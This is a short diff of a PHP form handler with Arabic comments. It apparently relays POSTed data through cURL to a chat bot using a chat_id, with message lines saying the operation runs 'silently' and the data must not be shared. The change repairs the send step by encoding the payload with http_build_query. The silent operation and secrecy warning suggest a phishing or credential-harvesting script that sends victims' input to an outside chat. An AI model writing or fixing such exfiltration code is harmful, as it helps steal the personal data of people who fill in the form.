@@ -20,7 +20,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $message .= "*العملية تتم في صمت.*\n\n";
     $message .= "⚠️ *تحذير:* هذه البيانات لا يجب أن تُشارك مع أي طرف آخر.\n";
 
-    // تنسيق الرسالة مع Markdown
+    // تنسيق البيانات بشكل صحيح لإرسالها عبر cURL
     $data = [
         'chat_id' => $user_id,
         'text' => $message,
@@ -31,7 +31,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data)); // تأكد من استخدام http_build_query لتنسيق البيانات
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     $response = curl_exec($ch);
     curl_close($ch);
